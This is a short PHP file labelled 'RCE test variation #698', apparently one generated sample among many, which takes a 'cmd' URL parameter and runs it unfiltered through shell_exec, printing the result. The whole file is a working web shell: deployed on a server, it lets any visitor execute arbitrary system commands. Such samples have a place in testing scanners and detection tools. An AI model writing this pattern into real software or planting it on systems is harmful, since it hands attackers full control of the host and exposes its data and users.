<?php
// RCE test variation #698
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>